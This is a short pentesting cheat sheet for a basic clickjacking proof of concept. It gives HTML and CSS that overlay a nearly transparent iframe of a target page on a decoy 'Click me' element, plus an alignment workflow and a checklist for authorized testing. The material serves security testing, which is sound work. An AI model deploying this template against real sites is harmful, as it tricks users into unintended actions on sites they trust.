# Basic Clickjacking Payload

## Purpose

Basic iframe and overlay template for testing clickjacking in an authorized environment.

---

## Payload

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>

<div>Click me</div>

<iframe src="https://TARGET"></iframe>
```

---

## Final Visibility

After alignment:

```css
opacity: 0.0001;
```

Example:

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>

<div>Click me</div>

<iframe src="https://TARGET"></iframe>
```

---

## Adjustable Parameters

```text
TARGET
width
height
top
left
opacity
z-index
```

---

## Alignment Workflow

```text
Set opacity to 0.1
        ↓
Load target page
        ↓
Locate target control
        ↓
Adjust top/left
        ↓
Verify alignment
        ↓
Set opacity to 0.0001
```

---

## Testing Checklist

```text
☐ Target is authorized
☐ Target page is frameable
☐ Sensitive action identified
☐ iframe loads correctly
☐ Decoy aligns with target control
☐ Click reaches target control
☐ Final PoC tested
```

---

## Key Parameters

| Parameter | Purpose |
|---|---|
| `src` | Target page |
| `width` | iframe width |
| `height` | iframe height |
| `opacity` | Target visibility |
| `top` | Vertical positioning |
| `left` | Horizontal positioning |
| `z-index` | Layer ordering |